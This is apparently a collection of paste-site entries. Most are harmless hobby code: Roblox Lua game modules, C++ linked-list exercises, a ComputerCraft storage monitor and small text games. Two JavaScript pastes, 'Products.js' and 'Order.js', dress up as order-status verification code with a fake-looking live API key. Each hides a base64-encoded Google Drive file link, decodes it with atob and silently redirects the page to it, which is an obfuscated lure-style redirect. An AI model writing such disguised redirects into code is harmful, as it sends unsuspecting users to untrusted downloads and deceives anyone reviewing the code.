	for _, Reply in Replies:GetChildren() do
		for _, ReplyComponent in Reply:GetDescendants() do
			if ReplyComponent:IsA(""ImageLabel"") or ReplyComponent:IsA(""ImageButton"") then
				TweenUtils.Tween(ReplyComponent, TweenInformation, {ImageTransparency = 1})
			elseif ReplyComponent:IsA(""TextLabel"") or ReplyComponent:IsA(""TextButton"") then
				TweenUtils.Tween(ReplyComponent, TweenInformation, {TextTransparency = 1})
			elseif ReplyComponent:IsA(""Frame"") then
				TweenUtils.Tween(ReplyComponent, TweenInformation, {BackgroundTransparency = 1})
			end
		end
		Replies.ScrollBarImageTransparency = 1
		if Reply:IsA(""Frame"") then
			task.spawn(function()
				TweenUtils.Tween(Reply, TweenInformation, {Size = REPLY_HIDE_SIZE}, true)
				Reply:Destroy()
			end)
			wait(.1)
		end
	end

	TweenUtils.Tween(Replies, TweenInformation, {Size = UDim2.new(.434, 0, 0, 0)}, true)
	Replies.Visible = false
end

ShowReplies = function(UserInterface, DialogueTable)
	local Container = UserInterface:WaitForChild(""Container"")
	local RepliesFrame = Container:WaitForChild(""Replies"")
	local ReplyTemplate = Container:WaitForChild(""Reply"")

	RepliesFrame.Visible = true
	TweenUtils.Tween(RepliesFrame, TweenInformation, {Size = UDim2.new(0.434, 0, 0.15, 0)})

	for ReplyIndex, ReplyValue in pairs(DialogueTable.Replies) do
		local Reply = ReplyTemplate:Clone()
		local Button = Reply.Button :: TextButton
		Button.Text = ReplyValue.ReplyContent
		Reply.Parent = RepliesFrame
		Reply.Name = tostring(ReplyIndex)
		Reply.Visible = true

		for _, ReplyComponent in Reply:GetDescendants() do
			if ReplyComponent:IsA(""ImageLabel"") or ReplyComponent:IsA(""ImageButton"") then
				TweenUtils.Tween(ReplyComponent, TweenInformation, {ImageTransparency = 0})
			elseif ReplyComponent:IsA(""TextLabel"") or ReplyComponent:IsA(""TextButton"") then
				TweenUtils.Tween(ReplyComponent, TweenInformation, {TextTransparency = 0})
			end
		end
		TweenUtils.Tween(Reply, TweenInformation, {Size = REPLY_SHOW_SIZE})

		table.insert(ReplyConnections, Button.MouseButton1Click:Connect(function()
			HideReplies(UserInterface)

			local NextDialogue = DialogueTable.Next[ReplyValue.Next(Player)]

			if NextDialogue then
				Advance(UserInterface, NextDialogue)
			else
				Exit(UserInterface)
			end
		end))
	end
end

Exit = function(UserInterface: ScreenGui)
	local UI = UserInterface
	local Container = UI:WaitForChild(""Container"")

	HideReplies(UI)
	InterfaceUtils.Hide(Container, 0.4, true)

	UI:Destroy()
end

Enter = function(UserInterface: ScreenGui, DialogueTable)
	local UI = UserInterface
	local Container = UI:WaitForChild(""Container"")
	local Dialogue = Container:WaitForChild(""Dialogue"")
	SetDialogue(UI, DialogueTable)
	DialogueTable.Function(Player)
	
	if DialogueTable.Next == nil or next(DialogueTable.Next) == nil then
		ContinuationConnection = Dialogue.Button.MouseButton1Click:Connect(function()
			Exit(UI)
		end)
	elseif (DialogueTable.Replies == nil or next(DialogueTable.Replies) == nil) and #DialogueTable.Next >= 1 then
		ContinuationConnection = Dialogue.Button.MouseButton1Click:Connect(function()
			Advance(UserInterface, DialogueTable.Next[1])
		end)
	else
		ShowReplies(UI, DialogueTable)
	end
end

local function Initialize()
	CharacterDataEvent.Event:Connect(function(ReplicaData)
		CharacterReplica = ReplicaData.CharacterData
	end)
	
	StartEvent.OnClientEvent:Connect(function(DialogID: number | string)
		local Dialogue = DialogueData[DialogID]
		if not Dialogue then return end

		local UI = DialogUI:Clone()
		local Container = UI:WaitForChild(""Container"")

		UI.Parent = Player.PlayerGui

		InterfaceUtils.Show(UI.Container, 0.4, false, true)

		Enter(UI, Dialogue)
	end)
end

Initialize()"
N3YxknT3,DataHandler,Ettaby,Lua,Wednesday 2nd of April 2025 01:35:22 PM CDT,"local ServerScriptService = game:GetService(""ServerScriptService"")
local HttpService = game:GetService(""HttpService"")
local ServerStorage = game:GetService(""ServerStorage"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local RunService = game:GetService(""RunService"")
local Players = game:GetService(""Players"")

local DataStoreService = game:GetService(""DataStoreService"")
local MockDataStoreService: Types.MockDataStoreService = require(ServerStorage.Libraries.Data.MockDataStoreService)

local ProfileStore : ProfileStore.ProfileStoreModule = require(ServerStorage.Libraries.Data.ProfileStore)
local ReplicaServer = require(ServerStorage.Libraries.Data.ReplicaServer)

local Shared = ReplicatedStorage:WaitForChild(""Shared"")

local Remotes = Shared.Remotes
local Data = Shared.Data
local Modules = Shared.Modules
local Libraries = Shared.Libraries

local DataTables = require(Data.DataTables)
local Types = require(Data.Types)

local LibraryLoader = require(Modules.LibraryLoader)

local MemoryStoreHandler = LibraryLoader:Load(Libraries.Services.MemoryStoreHandler)
local TableUtils = LibraryLoader:Load(ReplicatedStorage.Shared.Libraries.Utilities.TableUtils)
local Datastores = require(ServerStorage.ServerShared.Data.Datastores)

local LoadFallbackMessage = ""Your data has been loaded on a different server, please rejoin.""
local ProfilePrefix = ""Player_""

local DataHandler = {}
local PlayerData = {}

local Mock = RunService:IsStudio() and true or false

-- gets the datastore used by ProfileStore
local ProfileDataStore: Types.ProfileStore<Types.ProfileData> = not Mock and ProfileStore.New(Datastores[""ProfileDataStore""], {
	Characters = {},
	Settings = {}
}) or ProfileStore.New(Datastores[""ProfileDataStore""], {
	Characters = {},
	Settings = {}
}).Mock
-- gets the datastore used to store uuid-indexes character data
local CharacterDataStore: DataStore | Types.MockDataStore = not Mock and DataStoreService:GetDataStore(Datastores[""CharacterDataStore""]) or MockDataStoreService:GetDataStore(Datastores[""CharacterDataStore""])

local function CreateTestCharacter(Name: string, Surname: string, Race: number, Gender: number, PreferredGrip: number, FencingStyle: number, SkinTone: number, HairStyle: number): Types.Character
	return {
		Name = Name,
		Surname = Surname,
		Race = Race,
		Gender = Gender,
		Lives = 2,
		Balance = math.random(1000, 9999),
		PreferredGrip = PreferredGrip,
		FencingStyle = FencingStyle,
		Location = 1,
		StatusEffects = {},
		Quests = {},
		Appearance = {
			Hair = {
				Style = HairStyle,
				Color = {math.random(0, 255), math.random(0, 255), math.random(0, 255)},
			},
			SkinTone = SkinTone,
			EyeColor = {math.random(0, 255), math.random(0, 255), math.random(0, 255)},
			Clothing = {
				ClothingTopColor = {math.random(0, 255), math.random(0, 255), math.random(0, 255)},
				ClothingBottomColor = {0, 0, 0}
			},
		},
		Level = {
			Integer = 1,
			Experience = 0,
			Requirement = 100
		},
		Inventory = {
			Items = {},
			Equipped = {
				Accessories = {
					[1] = nil,
					[2] = nil,
					[3] = nil,
					[4] = nil,
					[5] = nil,
				},
				Vanity = {
					TopVanity = nil,
					BottomVanity = nil,
				},
				Armor = {
					Helmet = nil,
					Chestplate = nil,
					Leggings = nil,
				},
			},
		},
		Attributes = {
			Strength = 0,
			Agility = 0,
			Intelligence = 0,
			Charisma = 0,
			Fortitude = 0,
			Endurance = 0,
			Acting = 0,
			Luck = 0,
		},
		Skills = {
			SkillPoints = 0,
			Learned = {}
		},
	}
end

function DataHandler:GetPlayerData(Player: Player, Yield: boolean): Types.PlayerPersistentData
	local PlayerPersistentData = PlayerData[Player.UserId]
	repeat
		PlayerPersistentData = PlayerData[Player.UserId]
		task.wait()
	until PlayerPersistentData
	return PlayerPersistentData
end

function DataHandler.OnSave(Player)
	local PlayerPersistentData = PlayerData[Player.UserId]
	
	local Profile = PlayerPersistentData.Profile
	local Replica = PlayerPersistentData.Replica

	local ReplicaData = Replica.Data

	local CharacterData = ReplicaData.CharacterData
	local CharacterUUID = ReplicaData.CharacterUUID

	local Success, Message = pcall(function() CharacterDataStore:SetAsync(CharacterUUID, CharacterData, Profile.UserIds) end)
	if not Success then warn(`Failed to save character data for {Player.Name}: {Message}`) return end
end

local function PlayerAdded(Player: Player)
	local Profile: Types.Profile<Types.ProfileData> = ProfileDataStore:StartSessionAsync(ProfilePrefix..Player.UserId, {Steal = false})
	if not Profile then Player:Kick(""Profile not found."") return end

	Profile:Reconcile()
	Profile:AddUserId(Player.UserId)

	-- retrieves sent data received from teleporting
	local JoinData = MemoryStoreHandler:RetrieveAsync(Player, ""TeleportationMemory"")
	
	if not JoinData then
		if Mock then
			local UUID = HttpService:GenerateGUID(false)
			CharacterDataStore:SetAsync(UUID, CreateTestCharacter(Player.Name, `({Player.DisplayName})`, 1, 1, 1, 1, 1, 1))
			JoinData = {
				[""CharacterUUID""] = UUID
			}
		else
			Player:Kick(""No Teleportation Data Found."")
		end
	end

	local CharacterUUID = JoinData.CharacterUUID
	local CharacterData: Types.Character = CharacterDataStore:GetAsync(CharacterUUID)

	local Replica: Types.Replica = ReplicaServer.New({
		Token = ReplicaServer.Token(""CharacterData""),
		Tags = { Player },
		Data = {
			CharacterData = CharacterData,
			CharacterUUID = CharacterUUID
		},
		WriteLib = ReplicatedStorage.Replica.ReplicaShared.WriteLib
	})
	Replica:Subscribe(Player)

	-- listeners
	Profile.OnSave:Connect(function()
		DataHandler.OnSave(Player)
	end)

	PlayerData[Player.UserId] = {
		Profile = Profile,
		Replica = Replica,
	}
	
	print(CharacterData)
end

local function PlayerRemoving(Player: Player)
	local PlayerPersistentData = PlayerData[Player.UserId]
	if not PlayerPersistentData then return end

	local Profile: Types.Profile<Types.ProfileData> = PlayerPersistentData.Profile
	local Replica: Types.ReplicaData<Types.ReplicaData> = PlayerPersistentData.Replica

	if Profile then
		Profile:EndSession()
	end

	if Replica then
		Replica:Destroy()
	end

	PlayerData[Player.UserId] = nil
end

function DataHandler.Init()
	ProfileStore.SetConstant(""AUTO_SAVE_PERIOD"", 30)
	
	Players.PlayerAdded:Connect(PlayerAdded)
	Players.PlayerRemoving:Connect(PlayerRemoving)
end

return DataHandler"
QRxdb2rm,InventoryHandler,Ettaby,Lua,Wednesday 2nd of April 2025 01:34:47 PM CDT,"local ServerScriptService = game:GetService(""ServerScriptService"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local ServerStorage = game:GetService(""ServerStorage"")
local HttpService = game:GetService(""HttpService"")

local ServerModules = ServerScriptService.Modules
local DataHandler = require(ServerModules.DataHandler)

local Shared = ReplicatedStorage.Shared

local Remotes = Shared.Remotes

local Data = Shared.Data
local Modules = Shared.Modules
local Libraries = Shared.Libraries

local ServerShared = ServerStorage.ServerShared
local ItemTypes = ServerStorage.ItemTypes

local ServerRemotes = ServerShared.Remotes

local ItemPickedUpEvent = ServerRemotes.ItemPickedUp
local EquipEvent = Remotes.EquipItem
local UnequipEvent = Remotes.UnequipItem
local DropEvent = Remotes.DropItem
local LockEvent = Remotes.LockItem

local LibraryLoader = require(Modules.LibraryLoader)
local TableUtils = LibraryLoader:Load(Libraries.Utilities.TableUtils)

local DataTables = require(Data.DataTables)
local ItemsFolder = Data.Items

local InventoryHandler = {}

function InventoryHandler.Add(Player, ID, Quantity)
	local PlayerData = DataHandler:GetPlayerData(Player, true)
	local Replica = PlayerData.Replica
	local CharacterData = Replica.Data.CharacterData
	local Inventory = CharacterData.Inventory
	local Items = Inventory.Items

	if not ItemsFolder[ID] or typeof(ID) ~= ""number"" then warn(`{Player} picked up an item but the ID ({ID}) was invalid or was not found`) return end

	local ItemModule = require(ItemsFolder[ID])
	local ItemIndex = TableUtils.FindInTable(Items, function(Item) return Item.ID == ID end)

	if ItemIndex then
		local InventoryItem = Items[ItemIndex]
		local NewStack = InventoryItem.Stack + Quantity
		Replica:Set({""CharacterData"", ""Inventory"", ""Items"", ItemIndex, ""Stack""}, math.min(NewStack, ItemModule.MaxStack))
	else
		local InventoryItem = TableUtils.DeepCopyTable(DataTables.InventoryItem)
		InventoryItem.ID = ID
		InventoryItem.Stack = math.min(Quantity, ItemModule.MaxStack)
		Replica:Write(""Write"", {""CharacterData"", ""Inventory"", ""Items""}, InventoryItem)
	end
	
	print(CharacterData)
end

function InventoryHandler.Remove(Player, ID, Quantity)
	local PlayerData = DataHandler:GetPlayerData(Player, true)
	local Replica = PlayerData.Replica
	local CharacterData = Replica.Data.CharacterData
	local Inventory = CharacterData.Inventory
	local Items = Inventory.Items

	if not ItemsFolder[ID] or typeof(ID) ~= ""number"" then warn(`{Player} tried to remove an item but the ID ({ID}) was invalid or was not found`) return end

	local ItemIndex = TableUtils.FindInTable(Items, function(Item) return Item.ID == ID end)

	if ItemIndex then
		local InventoryItem = Items[ItemIndex]

		if InventoryItem.Stack >= Quantity then
			Replica:Set({""CharacterData"", ""Inventory"", ""Items"", ItemIndex, ""Stack""}, InventoryItem.Stack - Quantity)
			if InventoryItem.Stack == 0 then Replica:Set({""Items"", ItemIndex}, nil) end
		else
			warn(`{Player} tried to remove more items than they have for item ID ({ID})`)
		end
	else
		warn(`{Player} tried to remove an item that is not in their inventory (ID: {ID})`)
	end
end

function InventoryHandler.Equip(Player, Index)
	local PlayerData = DataHandler:GetPlayerData(Player, true)
	local Replica = PlayerData.Replica
	local CharacterData = Replica.Data.CharacterData
	local Inventory = CharacterData.Inventory
	local Items = Inventory.Items
	local ItemModule = ItemsFolder[Items[Index].ID]
	local ItemData = require(ItemModule)
	
	local Tool = ItemData.Tool:Clone()
	Tool.Parent = Player.Backpack
	require(ItemTypes[ItemData.Type]).Instantiate(Player, Tool, ItemModule)
	
	local Character = Player.Character
	local Humanoid: Humanoid = Character.Humanoid
	
	Humanoid:EquipTool(Tool)
end

function InventoryHandler.Init()
	EquipEvent.OnServerEvent:Connect(InventoryHandler.Equip)
	ItemPickedUpEvent.Event:Connect(InventoryHandler.Add)
end

return InventoryHandler"
wGKcm1dr,Untitled,Ettaby,Lua,Wednesday 2nd of April 2025 01:34:07 PM CDT,"--!strict
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Types = require(ReplicatedStorage.Shared.Data.Types)

local MockDataStoreService = {}
MockDataStoreService.__index = MockDataStoreService

local MockDataStore = {}
MockDataStore.__index = MockDataStore

local OrderedMockDataStore = {}
OrderedMockDataStore.__index = OrderedMockDataStore

local function createDataStoreInfo(name: string, scope: string): Types.MockDataStoreInfo
	return {
		Name = name,
		Scope = scope
	}
end

function MockDataStore.new(name: string, scope: string?): Types.MockDataStore
	local self: Types.MockDataStore = setmetatable({
		Name = name,
		Scope = scope or ""global"",
		Data = {} :: {[string]: any}
	}, MockDataStore) :: any

	return self
end

function MockDataStore:SetAsync(key: string, value: any): boolean
	self.Data[key] = value
	return true
end

function MockDataStore:GetAsync(key: string): any
	return self.Data[key]
end

function MockDataStore:RemoveAsync(key: string): any
	local value = self.Data[key]
	self.Data[key] = nil
	return value
end

function MockDataStore:UpdateAsync(key: string, transformFunction: (any?) -> any?): any?
	local currentValue = self.Data[key]
	local newValue = transformFunction(currentValue)
	if newValue ~= nil then
		self.Data[key] = newValue
	end
	return newValue
end

function OrderedMockDataStore.new(name: string, scope: string?): Types.OrderedMockDataStore
	return setmetatable(MockDataStore.new(name, scope), OrderedMockDataStore) :: any
end

function OrderedMockDataStore:GetSortedAsync(
	sortDirection: Enum.SortDirection | ""Ascending"" | ""Descending"",
	pageSize: number,
	minValue: number?,
	maxValue: number?
): Types.MockDataStorePage
	local entries: {Types.MockDataStoreEntry} = {}

	for key: string, value: any in pairs(self.Data) do
		if type(value) == ""number"" then
			if (not minValue or value >= minValue) and (not maxValue or value <= maxValue) then
				table.insert(entries, {
					key = key,
					value = value
				})
			end
		end
	end

	local direction: string = if typeof(sortDirection) == ""EnumItem""
		then sortDirection.Name
		else sortDirection

	table.sort(entries, function(a: Types.MockDataStoreEntry, b: Types.MockDataStoreEntry)
		if direction == ""Descending"" then
			return a.value > b.value
		end
		return a.value < b.value
	end)

	return {
		GetCurrentPage = function()
			return entries
		end
	}
end

function MockDataStoreService.new(): Types.MockDataStoreService
	local self: Types.MockDataStoreService = setmetatable({
		DataStores = {} :: {[string]: Types.MockDataStore},
		OrderedDataStores = {} :: {[string]: Types.OrderedMockDataStore}
	}, MockDataStoreService) :: any

	return self
end

function MockDataStoreService:GetDataStore(
	name: string,
	scope: string,
	options: DataStoreOptions?
): Types.MockDataStore
	scope = scope or ""global""
	local key: string = name .. "":"" .. scope

	if not self.DataStores[key] then
		self.DataStores[key] = MockDataStore.new(name, scope)
	end

	return self.DataStores[key]
end

function MockDataStoreService:GetOrderedDataStore(
	name: string,
	scope: string
): Types.OrderedMockDataStore
	scope = scope or ""global""
	local key: string = name .. "":"" .. scope

	if not self.OrderedDataStores[key] then
		self.OrderedDataStores[key] = OrderedMockDataStore.new(name, scope)
	end

	return self.OrderedDataStores[key]
end

function MockDataStoreService:ListDataStoresAsync(
	prefix: string?,
	pageSize: number?,
	cursor: string?
): Types.MockDataStorePage
	local results: {Types.MockDataStoreEntry} = {}

	for key: string, store: Types.MockDataStore in pairs(self.DataStores) do
		if not prefix or store.Name:find(""^"" .. prefix) then
			table.insert(results, {
				key = tostring(store.Name),
				value = 0
			})
		end
	end

	for key: string, store: Types.OrderedMockDataStore in pairs(self.OrderedDataStores) do
		if not prefix or store.Name:find(""^"" .. prefix) then
			table.insert(results, {
				key = tostring(store.Name),
				value = 0
			})
		end
	end

	return {
		GetCurrentPage = function()
			return results
		end
	}
end

return MockDataStoreService.new()"
ciWB1LhA,Products.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 01:18:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/134/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4i03jLwF,MemoryChecker,alexzapl_0318,Lua,Wednesday 2nd of April 2025 01:15:40 PM CDT,"--With big love by AZ

function drawProgressBar(x, y, width, percent, color)
    local fill = math.floor(width * percent)
    term.setCursorPos(x, y)
    term.setBackgroundColor(color)
    term.write(string.rep("" "", fill))
    term.setBackgroundColor(colors.gray)
    term.write(string.rep("" "", width - fill))
    term.setBackgroundColor(colors.black)
end

local function checkStorage()
    local totalSize, usedSize = 0, 0
    local disk, diskStr = 1, ""disk""
    for _, side in ipairs(peripheral.getNames()) do
        if peripheral.hasType(side, ""drive"") or fs.exists(side) then
            if disk ~= 1 then
                diskStr = ""disk""..disk
                disk = disk + 1
            end
            local free = fs.getFreeSpace(""/""..diskStr) / 1024
            local total = free + fs.getSize(""/""..diskStr) / 1024
            totalSize = totalSize + total
            usedSize = usedSize + (total - free)
        end
    end
    return totalSize, usedSize
end

local function checkMemory()
    return math.floor(fs.getCapacity(""/"") / 1024), math.floor(fs.getFreeSpace(""/"") / 1024)
end

term.clear()
while true do
    local totalMem, freeMem = checkMemory() -- pc
    local totalSize, usedSize = checkStorage() -- disks
    term.setCursorPos(1, 1)
    term.setTextColor(colors.white)
    print(""Space: "" .. math.floor(freeMem * 10000 + 0.5) / 10000 .. ""KB/"" .. math.floor(totalMem * 10000 + 0.5) / 10000 .. ""KB"")
    drawProgressBar(2, 3, 20, (totalMem - freeMem) / totalMem, colors.red)
    print(""Used: "" .. totalMem-freeMem .. ""KB \n\n"")

    print(""Disk space: "" .. math.floor((totalSize-usedSize) * 10000 + 0.5) / 10000 .. ""KB/"" .. math.floor(totalSize * 10000 + 0.5) / 10000 .. ""KB"")
    drawProgressBar(2, 8, 20, usedSize / totalSize, colors.red)
    print(""Used: "" .. usedSize .. ""KB \n\n"")

    sleep(1)
end
"
4ZxYspW2,Untitled,Josif_tepe,C++,Wednesday 2nd of April 2025 01:07:09 PM CDT,"#include <iostream>
using namespace std;

struct node {
    int info;
    node * next;
};

struct SLL {
    node * head, * tail;
    void init() {
        head = NULL;
        tail = NULL;
    }
    
    void insertFront(int x) {
        node * new_node = new node;
        new_node->info = x;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            tail->next = head;
        }
        else {
            new_node->next = head;
            head = new_node;
            tail->next = head;
        }
    }
    
    void insertEnd(int x) {
        node * new_node = new node;
        new_node->info = x;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            tail->next = head;
        }
        else {
            tail->next = new_node;
            tail = new_node;
            tail->next = head;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {
                node * tmp = head;
                head = head->next;
                tail->next = head;
                delete tmp;
                
            }
        }
    }
    
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {
                node * tmp = head;
                while(tmp->next != tail) {
                    tmp = tmp->next;
                }
                tmp->next = head;
                delete tail;
                tail = tmp;
            }
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else if(tail->info == x) {
                deleteEnd();
            }
            else {
                node * tmp = head;
                node * prev = NULL;
                
                while(tmp != NULL and tmp->info != x) {
                    prev = tmp;
                    tmp = tmp->next;
                }
                prev->next = tmp->next;
                delete tmp;
            }
        }
    }
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else if(tail == x) {
                deleteEnd();
            }
            else {
                node * tmp = head;
                node * prev = NULL;
                
                while(tmp != NULL and tmp != x) {
                    prev = tmp;
                    tmp = tmp->next;
                }
                prev->next = tmp->next;
                delete tmp;
            }
        }
    }
    
    void deleteAll() {
        while(head != NULL) {
            deleteEnd();
        }
    }
    void print() {
        node * tmp = head;
        
        while(tmp != tail) {
            cout << tmp->info << ""-->"";
            tmp = tmp->next;
            
        }
        cout << tail->info << ""-->"";
        tmp = tmp->next;
        while(tmp != tail) {
            cout << tmp->info << ""-->"";
            tmp = tmp->next;
            
        }
        cout << tmp->info;
        cout << endl;
    }
};
int main() {
    
    SLL sll;
    sll.init();
    sll.insertEnd(108);
    sll.insertEnd(105);
    sll.insertEnd(110);
    sll.insertEnd(107);
    sll.insertEnd(101);
    sll.insertEnd(100);
    sll.insertEnd(108);
    sll.insertEnd(111);
    sll.insertEnd(111);
    sll.insertEnd(112);
    
    sll.tail->next = sll.head->next->next->next->next->next->next;
    
    
    
    
    
    

return 0;
    
}
"
WEVvS7Uu,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 01:03:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/357/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VKqu7g7r,Untitled,Josif_tepe,C++,Wednesday 2nd of April 2025 12:56:42 PM CDT,"#include <iostream>
using namespace std;


struct node {
    int info;
    node * next;
    node * prev;
};

struct DLCL {
    node * head, * tail;
    void init() {
        head = NULL;
        tail = NULL;
    }
    
    void insertFront(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            head->next = tail;
            tail->prev = head;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
            tail->next = head;
            head->prev = tail;
        }
        
    }
    
    void insertEnd(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            head->prev = tail;
            tail->next = head;
        }
        else {
            tail->next = new_node;
            new_node->prev = tail;
            
            tail = new_node;
            tail->next = head;
            head->prev = tail;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {

                head = head->next;
                delete head->prev;
                head->prev = tail;
                tail->next = head;
                
            }
        }
    }
    
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {
                tail = tail->prev;
                delete tail->next;
                tail->next = head;
                head->prev = tail;
            }
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp->info != x) {
                    tmp = tmp->next;
                }
                if(tmp->next == head) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                }
            }
        }
    }
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != x) {
                    tmp = tmp->next;
                }
                if(tmp->next == head) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                }
            }
        }
    }
    
    void inserAfter(int x, node * after) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(after != NULL) {
            if(after == head) {
                insertFront(x);
            }
            else if(after == tail) {
                insertEnd(x);
            }
            else {
                
                new_node->next = after->next;
                new_node->prev = after;
                after->next = new_node;
                new_node->next->prev = new_node;
            }
        }
    }
    void print() {
        if(head != NULL) {
            node * tmp = head;
            while(tmp != tail) {
                cout << tmp->info << ""-->"";
                tmp = tmp->next;
            }
            cout << tmp->info<<""-->"";
            tmp = tmp->next;
            while(tmp != tail) {
                cout << tmp->info << ""-->"";
                tmp = tmp->next;
            }
            cout << tmp->info << endl;
            
            while(tmp != head) {
                cout << tmp->info << ""<--"";
                tmp = tmp->prev;
            }
            cout << tmp->info << ""<--"";
            tmp = tmp->prev;
            while(tmp != head) {
                cout << tmp->info << ""<--"";
                tmp = tmp->prev;
            }
            cout << tmp->info << endl;
        }
    }
    
};
int main() {
    DLCL dll;
    dll.init();
    
    dll.insertFront(1);
    dll.insertFront(2);
    dll.insertFront(3);
    
    dll.insertEnd(4);
    dll.insertEnd(5);
    dll.insertEnd(6);
    dll.print();
    
    
    node * tmp = dll.head->next;
    dll.inserAfter(7, tmp);
    
    dll.print();
    
    return 0;
}
"
QUaT5eRq,combat,drakon-firestone,C++,Wednesday 2nd of April 2025 12:53:25 PM CDT,"void start_combat()
{
	Entity enemy = Entity(""Kosmita"");
    bool combatRunning = true;
	int choice, playerDamage, enemyDamage;
    while (combatRunning)
	{
        cout << endl << ""Co chcesz zrobić?"" << endl;
        cout << ""------------------------------------------------"" << endl;
        cout << ""Twoje życie: "" << player.get_health() << "" | Życie przeciwnika: "" << enemy.get_health() << endl;
		cout << ""------------------------------------------------"" << endl;

        cout << ""[1] Atakuj!"" << endl;
        cout << ""[2] Uciekaj!"" << endl << endl;
        cout << ""Wpisz numer: "";
        cin >> choice;
        
        switch (choice)
        {
        case 1: // Gracz atakuje
        	playerDamage = rand() % player.get_damage() + 1;

            cout << player.get_name() << "" atakuje! Rani przeciwnika o "" << playerDamage << "" punkty!"" << endl;
            enemy.dealDamage(playerDamage);
                
            if(enemy.get_health() > 0)
            {
            	enemyDamage = rand() % enemy.get_damage()  + 1;
				cout << enemy.get_name() << "" kontratakuje! Rani bohatera o "" << enemyDamage << "" punkty!"" << endl;

                player.dealDamage(enemyDamage);
                if(player.get_health() <= 0)
                {
                	cout << player.get_name() << "" przegrywa! Koniec walki!"" << endl;
					combatRunning = false;
                }
            }
            else
            {
                cout << enemy.get_name() << "" przegrywa! Koniec walki!"" << endl;
                cout << player.get_name() << "" znajduje 10 metalu!"" << endl;

                player.add_metal(10);
                combatRunning = false;
            }
        	break;
                
        case 2: // Gracz ucieka
            cout << player.get_name() << "" ucieka tracąc kolejne 5% tlenu! Koniec walki!"" << endl;
            player.change_oxygen(-5);
            combatRunning = false;
            break;

        }
    }
}"
09tPuJqe,Pillole video 7,fcamuso,C++,Wednesday 2nd of April 2025 12:48:22 PM CDT,"#include <iostream>
#include <chrono>
#include <vector>


using namespace std;

struct Nodo {
  string dato = """";

  Nodo *next = nullptr;
};



void ins_testa(Nodo *&il, Nodo *nuovo)
{
    nuovo->next = il;
    il = nuovo;
}



void ins_coda(Nodo *&il, Nodo *nuovo)
{
  if (il == nullptr) //lista vuota ?
  {
    nuovo->next = il;
    il = nuovo;
  }
  else
  {
    Nodo *ultimo = il;

    //otteniamo un puntatore all'ultimo nodo attuale
    while(ultimo->next != nullptr) ultimo = ultimo->next;

    ultimo->next = nuovo;
